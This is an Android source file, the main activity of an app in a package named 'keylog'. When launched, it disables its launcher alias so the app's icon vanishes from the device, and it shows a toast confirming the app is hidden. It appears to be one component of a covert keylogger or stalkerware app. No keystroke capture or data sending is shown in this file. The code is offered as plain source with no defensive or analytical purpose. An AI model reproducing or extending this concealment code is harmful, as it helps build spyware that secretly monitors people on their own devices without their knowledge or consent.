package xyz.logchar.keylog;

import android.annotation.SuppressLint;
import android.content.ComponentName;
import android.content.pm.PackageManager;
import androidx.appcompat.app.AppCompatActivity;
import android.os.Bundle;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {

    @SuppressLint("ClickableViewAccessibility")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        hideAppIcon();
    }

    private void hideAppIcon() {
        PackageManager packageManager = getPackageManager();
        ComponentName aliasName = new ComponentName(this, "xyz.logchar.keylog.MainActivityAlias");
        packageManager.setComponentEnabledSetting(
                aliasName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
        );
        Toast.makeText(this, "App hidden! Restart the device to fully apply the changes.", Toast.LENGTH_SHORT).show();
    }
}
